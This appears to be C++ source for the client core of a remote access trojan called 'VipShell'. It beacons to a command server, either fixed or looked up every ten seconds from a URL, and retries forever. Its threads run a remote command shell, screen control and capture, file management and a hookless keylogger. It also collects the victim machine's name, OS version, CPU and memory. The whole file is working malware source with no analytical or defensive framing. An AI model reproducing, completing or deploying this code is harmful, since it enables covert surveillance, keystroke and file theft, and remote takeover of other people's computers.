#include ".\vipshellex.h"

#include ".\connectserverproc.h"
#include ".\shellcommandproc.h"
#include ".\screencontrolproc.h"
#include ".\getcappictureproc.h"
#include ".\filemanageproc.h"
#include ".\getkeynohookproc.h"
#include "tools.h"


CVipShellEx::CVipShellEx(void)
{
	
	_Init();
}

CVipShellEx::~CVipShellEx(void)
{
}

void CVipShellEx::OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter)
{
	if(dwCreateMarker == CREATE_THREAD_MARKER_CONNECTSERVERBYURL)
	{
		_ThreadConnectServerByUrl((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if(dwCreateMarker == CREATE_THREAD_MARKER_CONNECTSERVER)
	{
		COpenDesktop hDesktop;
		_ThreadConnectServer((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if (dwCreateMarker == CREATE_THREAD_MARKER_SCREENINFO)
	{
		
		_ThreadSendScreenInfo((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if (dwCreateMarker == CREATE_THREAD_MARKER_SHELLCOMMAND)
	{
		COpenDesktop hDesktop;
		_ThreadSendShell((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if(dwCreateMarker == CREATE_THREAD_MARKER_GETCAP)
	{
		COpenDesktop hDesktop;
		_ThreadSendCap((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if (dwCreateMarker  == CREATE_THREAD_MARKER_FILEMANAGE)
	{
		COpenDesktop hDesktop;
		_ThreadSendFileManage((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}else if (dwCreateMarker == CREATE_THREAD_MARKER_GETKEYLOG)
	{
		COpenDesktop hDesktop;
		_ThreadSendGetKeyLogNoHook((tagServerAddr*)lpParameter, dwThreadId);
		delete lpParameter;
	}
	
}
void CVipShellEx::ConnectServerEx(ULONG ip, DWORD dwPort, DWORD dwType, DWORD dwConnectId)
{
	std::wstring strIp;
	struct in_addr sa;
	sa.S_un.S_addr = ntohl(ip);
	strIp = CA2W(inet_ntoa(sa));
	return ConnectServerEx(strIp.c_str(), dwPort, dwType, dwConnectId);
}
void CVipShellEx::ConnectServerEx(LPCWSTR szServer, DWORD dwPort, DWORD dwType, DWORD dwConnectId)
{
	tagServerAddr* pInfo = new tagServerAddr;
	pInfo->dwPort = dwPort;
	pInfo->strAddr = szServer;
	pInfo->dwConnectId = dwConnectId;
	NewThread(pInfo, NULL, NULL, dwType);
}
void CVipShellEx::ConnectServer(LPCWSTR szServer, DWORD dwPort)
{
	return ConnectServerEx(szServer, dwPort, CREATE_THREAD_MARKER_CONNECTSERVER);
}
void CVipShellEx::ConnectServer(LPCWSTR szUrl)
{
	return ConnectServerEx(szUrl, 0, CREATE_THREAD_MARKER_CONNECTSERVERBYURL);
}
void CVipShellEx::_ThreadSendGetKeyLogNoHook(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CGetKeyNoHookProc hServer;
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
			return ;
		}
	}
}

void CVipShellEx::_ThreadSendFileManage(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CFileManageProc hServer;
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
			return ;
		}
	}
}

void CVipShellEx::_ThreadSendCap(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CGetCapPictureProc hServer;
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
			return ;
		}
	}
}

void CVipShellEx::_ThreadSendScreenInfo(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CScreenControlProc hServer;
//			hServer.SetServerSystemInfo(GetServerSystemInfo());
			hServer.SetConnectId(pInfo->dwConnectId);
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
			return ;
		}
	}
	
}
void CVipShellEx::_ThreadSendShell(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CShellCommandProc hServer;
//			hServer.SetServerSystemInfo(GetServerSystemInfo());
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
			return ;
		}
	}
}
void CVipShellEx::_ThreadConnectServerByUrl(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	std::wstring strRet;
	WCHAR szIp[256];
	WCHAR szPort[10];
	while(true){
		Sleep(10000);
		strRet.clear();
		if( !DownFile(pInfo->strAddr.c_str(), NULL, &strRet) )
			continue;
		int nFind  = (int)strRet.find(L":");
		if(nFind == -1 || nFind > 255)
			continue;
		int nPortlen = (int)strRet.length() - nFind;
		if((strRet.length() - nFind) == 0 )
			continue;
		if(	 6 < nPortlen )
			continue;
		memset(szIp, 0, sizeof(szIp));
		strRet.copy(szIp, nFind);
		memset(szPort, 0, sizeof(szPort));
		strRet.copy(szPort, strRet.length() - nFind, nFind +1);
		if( hConnectServer.ConnectServer(szIp, _ttoi(szPort)))
		{
			CConnectServerProc hServer;
			hServer.SetServerSystemInfo(GetServerSystemInfo());
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
		//	return ;
		}
	}
}
void CVipShellEx::_ThreadConnectServer(tagServerAddr* pInfo, DWORD dwThreadId)
{
	CVipShellCTcpClient hConnectServer;
	while(true){
		Sleep(10000);
		if( hConnectServer.ConnectServer(pInfo->strAddr.c_str(), pInfo->dwPort))
		{
			CConnectServerProc hServer;
			hServer.SetServerSystemInfo(GetServerSystemInfo());
			hServer.SetBindVipShellCTcpClient(&hConnectServer, this);
			hServer.DoCommandProc();
			//连接成功
		//	return ;
		}
	}
}
tagServerSystemInfo* CVipShellEx::GetServerSystemInfo()
{
	return &sysinfo;
}
void CVipShellEx::_Init()
{
	sysinfo.bIsCanCap = IsCanCap();
	sysinfo.dwCpuSpeed = GetCpuInfo();
	DWORD dwLen = sizeof(sysinfo.szName);
	GetComputerName(sysinfo.szName, &dwLen);
	GetServerEdition(&sysinfo.dwMajorVersion, &sysinfo.dwMinorVersion, &sysinfo.dwPlatformId);
	sysinfo.dwMemory = GetMemorySize();
}

void CVipShellEx::SetExplain(LPCWSTR szExplain)
{
	lstrcpyW(sysinfo.szExplain, szExplain);
}